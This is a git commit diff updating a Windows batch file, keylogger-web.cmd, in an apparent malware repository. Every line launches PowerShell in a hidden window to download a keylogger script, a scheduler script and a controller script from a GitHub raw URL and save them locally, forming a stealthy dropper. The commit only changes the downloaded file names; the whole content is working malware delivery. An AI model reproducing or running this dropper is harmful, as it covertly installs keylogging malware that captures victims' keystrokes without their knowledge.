b4a6163dfd9db726555e26676adb8abca77c48a8
gozen-foto <gofoto.zen@proton.me>
2026-06-01 11:35:58 +0530

    Update keylogger-web.cmd

--- paypack/keycap/keylogger-web.cmd
+++ paypack/keycap/keylogger-web.cmd
@@ -1,7 +1,7 @@
 @echo off
 
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/keylogger.ps1 -OutFile p.ps1"
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/keycap.ps1 -OutFile keycap.ps1"
 
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/scheduler.ps1 -OutFile i.ps1"
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/scheduler.ps1 -OutFile sduler.ps1"
 
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/controller.cmd -OutFile control.cmd"
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/controller.cmd -OutFile coller.cmd"
